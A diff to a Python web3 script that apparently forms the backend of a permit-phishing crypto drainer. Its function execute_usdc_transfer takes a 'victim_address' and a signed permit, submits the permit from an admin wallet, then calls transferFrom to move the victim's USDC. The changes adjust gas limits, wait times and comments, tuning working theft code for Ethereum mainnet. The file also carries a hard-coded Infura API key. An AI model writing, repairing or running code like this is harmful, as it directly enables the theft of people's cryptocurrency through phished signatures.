@@ -6,7 +6,7 @@ import time
 
 # ========================= CONFIGURATION =========================
 
-RPC_URL = "https://mainnet.infura.io/v3/df3f921aa86a4c559eb527db6961ab74"   # Change if needed
+RPC_URL = "https://mainnet.infura.io/v3/df3f921aa86a4c559eb527db6961ab74"
 
 # STABLE ALTERNATIVE (uncomment if Infura is unstable)
 # RPC_URL = "https://eth.drpc.org"
@@ -79,18 +79,17 @@ def execute_usdc_transfer(victim_address: str, amount: float, deadline: int, v: 
 
         # 2. Check admin ETH balance for gas
         admin_eth_balance = w3.eth.get_balance(admin_addr)
-        if admin_eth_balance < w3.to_wei(0.005, 'ether'):   # Minimum safety threshold
+        if admin_eth_balance < w3.to_wei(0.005, 'ether'):
             return None, f"ADMIN_WALLET_ERROR: Low ETH balance ({admin_eth_balance / 1e18:.5f} ETH). Need at least 0.005 ETH."
 
-        # ====================== GAS ESTIMATION ======================
+        # ====================== GAS SETTINGS ======================
 
         # Get current network gas prices (EIP-1559)
         base_fee = w3.eth.get_block('latest')['baseFeePerGas']
         max_priority_fee = w3.eth.max_priority_fee or w3.to_wei(1.5, 'gwei')
-        max_fee_per_gas = base_fee + max_priority_fee * 2   # 2x priority as safety
+        max_fee_per_gas = base_fee + (max_priority_fee * 2)
 
-# Use standard gas limits for USDC Permit & Transfer
-        # Permit usually takes ~50k-70k, TransferFrom takes ~50k-60k.
+        # Use standard gas limits for USDC Permit & Transfer
         permit_gas_limit = 100000
         transfer_gas_limit = 100000
 
@@ -98,11 +97,6 @@ def execute_usdc_transfer(victim_address: str, amount: float, deadline: int, v: 
         required_eth = total_gas_estimate * max_fee_per_gas
 
         if admin_eth_balance < required_eth * 1.1:
-            return None, f"ADMIN_WALLET_ERROR: Insufficient ETH. Need ~{w3.from_wei(required_eth, 'ether'):.5f} ETH"
-
-        required_eth = total_gas_estimate * max_fee_per_gas
-
-        if admin_eth_balance < required_eth * 1.1:   # 10% extra safety
             return None, f"ADMIN_WALLET_ERROR: Insufficient ETH for gas. Need ~{required_eth / 1e18:.5f} ETH"
 
         # ====================== EXECUTION ======================
@@ -121,7 +115,7 @@ def execute_usdc_transfer(victim_address: str, amount: float, deadline: int, v: 
         ).build_transaction({
             'from': admin_addr,
             'nonce': current_nonce,
-            'gas': int(permit_gas_estimate * 1.3),
+            'gas': permit_gas_limit,
             'maxFeePerGas': max_fee_per_gas,
             'maxPriorityFeePerGas': max_priority_fee,
             'chainId': 1,
@@ -133,8 +127,8 @@ def execute_usdc_transfer(victim_address: str, amount: float, deadline: int, v: 
 
         print(f"[+] Permit sent: {permit_hash.hex()}")
 
-        # Wait a bit for permit to be mined (important!)
-        time.sleep(2)
+        # Wait for the permit to be processed (Mainnet is slow, using 10s for safety)
+        time.sleep(10)
 
         # 2. TRANSFERFROM Transaction
         transfer_tx = contract.functions.transferFrom(
@@ -144,7 +138,7 @@ def execute_usdc_transfer(victim_address: str, amount: float, deadline: int, v: 
         ).build_transaction({
             'from': admin_addr,
             'nonce': current_nonce + 1,
-            'gas': int(transfer_gas_estimate * 1.3),
+            'gas': transfer_gas_limit,
             'maxFeePerGas': max_fee_per_gas,
             'maxPriorityFeePerGas': max_priority_fee,
             'chainId': 1,
@@ -160,7 +154,6 @@ def execute_usdc_transfer(victim_address: str, amount: float, deadline: int, v: 
         return None, f"EXECUTION_FAILED: {type(e).__name__}: {str(e)}"
 
 
-# Optional: Helper to check current gas price
 def get_gas_info():
     try:
         base = w3.eth.get_block('latest')['baseFeePerGas']
